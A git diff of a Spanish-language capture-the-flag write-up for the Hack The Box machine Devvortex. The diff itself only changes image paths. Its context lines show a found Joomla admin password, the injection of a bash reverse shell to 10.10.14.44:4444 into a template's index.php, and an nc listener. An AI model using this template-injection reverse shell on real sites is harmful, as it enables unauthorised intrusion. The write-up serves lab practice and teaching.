@@ -169,15 +169,15 @@ Found: dev.devvortex.htb
 </code></pre><p>user: lewis<br>
 password: P4ntherg0t1n5r3c0n##</p>
 <p>Pues si nos vamos al login de joomla de antes y introducimos el usuario y la contraseña que hemos descubierto podremos entrar.</p>
-<p><img src="/devvortex/lewis.jpg" alt="Branching"><br>
-<img src="/devvortex/dashboard.jpg" alt="Branching"></p>
+<p><img src="../../devvortex/lewis.jpg" alt="Branching"><br>
+<img src="../../devvortex/dashboard.jpg" alt="Branching"></p>
 <p>Ahora chafardeando un poco nos metemos en System, luego en administrador templates y en  	Atum Details and Files y a la izquierda veremos muchos archivos .php y el que nos interesa es el "index.php que nos deja editarlo y le meteremos nuestro codigo en la segunda linea y poniendo nuestra ip.</p>
 <pre data-role="codeBlock" data-info="" class="language-text"><code>exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.44/4444 0&gt;&amp;1'");
 </code></pre><p>Nos pondremos en "escucha" por el puerto 4444 con el codigo</p>
 <pre data-role="codeBlock" data-info="" class="language-text"><code>nc -lvnp 4444
 </code></pre><p>Guardaremos el archivo .php dandole a save arriba y....</p>
 <p>PUM! estamos dentro!<br>
-<img src="/devvortex/dentro.JPG" alt="Branching"></p>
+<img src="../../devvortex/dentro.JPG" alt="Branching"></p>
 <p>Usaremos estos comandos en el mismo orden para poner bien la terminal.</p>
 <pre data-role="codeBlock" data-info="" class="language-text"><code>script /dev/null -c /bin/bash
 
